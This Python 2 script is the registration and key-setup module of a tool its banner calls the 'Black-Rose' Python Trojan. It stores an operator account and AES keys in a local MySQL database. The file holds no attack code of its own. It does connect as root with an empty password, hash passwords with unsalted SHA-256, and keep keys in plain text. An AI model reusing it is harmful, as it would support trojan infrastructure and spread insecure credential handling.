#! /usr/bin/python

# Importing the requirement modules
import subprocess
import platform
import colorama
import MySQLdb
import hashlib
import base64
import sys
import os

from termcolor import colored
from Crypto.Cipher import AES
from Crypto import Random

# Making ANSI color
colorama.init()

# Some global variables
PLATFORM = platform.platform()

# Clean terminal
def Clear_display():
    if "Linux" in PLATFORM:
        subprocess.call("clear", shell=True)
    elif "Windows" in PLATFORM:
        subprocess.call("cls", shell=True)
    else:
        print colored("[ERROR]>", "red"), colored("Sorry, Operating system not defined.", "white")
        sys.exit()



# Show banner
def Display():
    print "    .-.    "
    print colored("   (o.o)   ", "red"), colored("+--------------------------+", "white")
    print colored("    |=|    ", "yellow"), colored("|  Black-Rose Registration |", "magenta")
    print colored("   __|__   ", "yellow"), colored("+--------------------------+", "white")
    print colored(" //.=|=.\\ ", "white"),  colored(" No matter how far you travel", "yellow")
    print colored(r"// .=|=. \\", "white"), colored("You can never get away from yourself", "yellow")
    print colored(r"\\ .=|=. //", "white"), colored("It's like your shadow", "yellow")
    print colored(r" \\(_=_)// ", "white"), colored("It follow you everywhere", "yellow")
    print colored("  (:| |:)  ", "yellow")
    print colored("   || ||   ", "yellow")
    print colored("   () ()   ", "yellow"), colored("[Black-Rose]:", "magenta"), colored("is a Python Trojan", "white")
    print colored("   || ||   ", "yellow"), colored("[Coded-by]:", "magenta"),  colored("Sha2ow_M4st3r", "white")
    print colored("   || ||   ", "yellow"), colored("[Contact]:", "magenta"), colored("Sha2ow@protonmail.com", "white")
    print colored("  ==' '==  ", "green"),  colored("[Github]:", "magenta"), colored("https://github.com/Sha2ow-M4st3r\n", "white")
    print "\n"



# Running MySQL service
def MySQL_Service():
    print colored("[WAITING]>", "grey"), colored("Starting MySQL service.../", "white")
    
    try:
        subprocess.call("service mysql start", shell=True)
        print colored("[MESSAGE]>", "grey"), colored("MySQL service", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("ACTIVATED", "green"), colored("]", "white")
    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL service", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        sys.exit()



# Starting MySQL connection
def MySQL_CONNECTION(IP_Address, DB_User, DB_Pass, DB_Name):
    global MySQL_DB

    try:
        # Open database connection
        MySQL_DB = MySQLdb.connect(IP_Address, DB_User, DB_Pass, DB_Name)
        print colored("[MESSAGE]>", "grey"), colored("MySQL connection", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("ACTIVATED", "green"), colored("]", "white")
    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL connection", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        sys.exit()



# Prepare cursor
def MySQL_CURSOR():
    global Cursor

    try:
        # Prepare a cursor object using cursor() method
        Cursor = MySQL_DB.cursor()
        print colored("[MESSAGE]>", "grey"), colored("MySQL cursor", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("CREATED", "green"), colored("]", "white")
    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL curosr", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "green"), colored("]", "white")



# Checking whether or not there is a password table
def MySQL_TABLE_CHECK():
    # SQL query
    MySQL_QUERY = "SELECT 1 FROM pocket LIMIT 1"

    try:
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_QUERY)
        print colored("[MESSAGE]>", "grey"), colored("MySQL table", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("EXIST", "green"), colored("]", "white")
        MySQL_TABLE_VALUES_CHECK()
    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL table", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("NOT EXIST", "red"), colored("]", "white")
        Create_MySQL_TABLE()



# Checking values from password table
def MySQL_TABLE_VALUES_CHECK():
    # SQL query
    MySQL_QUERY = "SELECT * FROM pocket"

    try:
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_QUERY)
        # Save fetchall result
        Data = Cursor.fetchall()

        if len(Data) == 0:
            print colored("[MESSAGE]>", "grey"), colored("MySQL table values check", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("NO VALUE", "red"), colored("]", "white")
            Register()
        else:
            print colored("[MESSAGE]>", "grey"), colored("MySQL table values check", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("FULL", "green"), colored("]", "white")
            Edit_MODE()
    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL table values check", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("ERROR", "red"), colored("]", "white")
        Cursor.close()
        MySQL_DB.close()
        sys.exit()




# Create table
def Create_MySQL_TABLE():
    # SQL query
    MySQL_QUERY = "CREATE TABLE pocket (Username VARCHAR(255), Password VARCHAR(65), IV VARCHAR(25), AES_KEY VARCHAR(44), Secret VARCHAR(25))"

    try:
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_QUERY)
        print colored("[MESSAGE]>", "grey"), colored("MySQL table creation", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("SUCCESS", "green"), colored("]", "white")
        Register()
    except:
        print colored("[MESSAGE]>", "grey"), colored("MySQL table creation", "white"), colored("\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        


# Register by username and password
def Register():
    global Username

    print "\n"
    print colored("You are in registration mode", "yellow")
    print colored("+---------------------------+", "white")
    print colored("[WARNING]", "yellow"), colored("You can leave your username blank.\n", "white")

    Username = raw_input(colored("[Username@Black-Rose]> ", "magenta"))
    Password = raw_input(colored("[Password@Black-Rose]> ", "magenta"))

    while len(Password) < 8:
        print colored("[WARNING]>", "yellow"), colored("Minimum password length must be 8 character", "white")
        Password = raw_input(colored("[Password@Black-Rose]> ", "magenta"))

    # Password was encrypted with SHA-256 algorithm
    Hashed_PASSWORD = hashlib.sha256(Password).hexdigest()

    try:
        # Execute SQL query using execute() method
        Cursor.execute("INSERT INTO pocket VALUES (%s, %s, %s, %s, %s)", (Username, Hashed_PASSWORD, "-", "-", "-"))
        # Commit your changes in the database
        MySQL_DB.commit()
        print colored("[MESSAGE]>", "grey"), colored("Your account", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("REGISTERED", "green"), colored("]", "white")
        Generate_KEY()
    except:
        print colored("[MESSAGE]>", "grey"), colored("Your account", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("NOT REGISTERED", "red"), colored("]", "white")



# Edit your credential
def Edit_MODE():
    print "\n"
    print colored("You are in edit mode", "yellow")
    print colored("+---------------------------+", "white")
    print colored("[WARNING]", "yellow"), colored("If you don't want to change username or password, just press enter.\n", "white")

    MySQL_QUERY1 = "SELECT * FROM pocket"
    MySQL_QUERY2 = "UPDATE pocket SET Username=%s, Password=%s WHERE Password=%s"

    try:
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_QUERY1)
        # Save fetchall result
        Data = Cursor.fetchall()
    except:
        print colored("[ERROR]>", "red"), colored("Reading data", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
        Cursor.close()
        MySQL_DB.close()
        sys.exit()
    
    print colored("[MESSAGE]>", "grey"), colored("Current account", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored(Data[0][0], "blue"), colored("]", "white")
    
    while True:
        Question = raw_input(colored("\n[QUESTION]> You want to change your credential? (Y/N): ", "white"))

        if Question == "N" or Question == "n":
            break
        elif Question == "Y" or Question == "y":
            Current_PASSWORD = raw_input(colored("[Current-Password@Black-Rose]> ", "magenta"))

            # Check password
            if hashlib.sha256(Current_PASSWORD).hexdigest() == Data[0][1]:
                Current_PASSWORD = hashlib.sha256(Current_PASSWORD).hexdigest()

                Username = raw_input(colored("[Username@Black-Rose]> ", "magenta"))
                if len(Username) == 0:
                    Username = Data[0][0]
                
                Password = raw_input(colored("[Password@Black-Rose]> ", "magenta"))
                if len(Password) == 0 or len(Password) < 8:
                    print colored("\n[WARNING]>", "yellow"), colored("Minimum password length must be 8 character", "white")
                    print colored("[WARNING]>", "yellow"), colored("The password is the same as the previous one", "white")
                    Password = Data[0][1]
                else:
                    Password = hashlib.sha256(Password).hexdigest()
                
                # Set all changes
                try:
                    # Execute SQL query using execute() method
                    Cursor.execute(MySQL_QUERY2, (Username, Password, Current_PASSWORD))
                    # Commit your changes in the database
                    MySQL_DB.commit()
                    print colored("\n[MESSAGE]>", "grey"), colored("Edit status", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("DONE", "green"), colored("]", "white")
                    break
                except:
                    print colored("\n[MESSAGE]>", "grey"), colored("Edit status", "white"), colored("\t\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")
                    break
            else:
                print colored("[MESSAGE]>", "grey"), colored("Current password", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("WRONG", "red"), colored("]", "white")
                continue
        else:
            print colored("[ERROR]>", "red"), colored("Command not recognized", "white")
            break
    
    print colored("\n[NOTE]", "yellow"), colored("You Can't Run From Your Shadow. But You Can Invite It To Dance", "white")
    Cursor.close()
    MySQL_DB.close()



# Key functions
def Generate_KEY():
    Rand = Random.new()
    AES_Key = base64.b64encode(Rand.read(AES.key_size[2]))
    Shared_SECRET_KEY = base64.b64encode(os.urandom(16))
    Initialization_Vector = base64.b64encode(Rand.read(AES.block_size))

    MySQL_QUERY = "UPDATE pocket SET AES_KEY=%s, Secret=%s, IV=%s WHERE Username=%s"

    try:
        # Execute SQL query using execute() method
        Cursor.execute(MySQL_QUERY, (AES_Key, Shared_SECRET_KEY, Initialization_Vector, Username))
        # Commit your changes in the database
        MySQL_DB.commit()
        print colored("[MESSAGE]>", "grey"), colored("Generating key", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("SUCCESS", "green"), colored("]", "white")
    except:
        print colored("[MESSAGE]>", "grey"), colored("Generating key", "white"), colored("\t\t\t\t:", "white"), colored("[", "white"), colored("FAILED", "red"), colored("]", "white")



# Main function
def Main():
    Clear_display()
    Display()
    MySQL_CONNECTION("localhost", "root", "", "info") 
    MySQL_CURSOR()
    MySQL_TABLE_CHECK()

Main()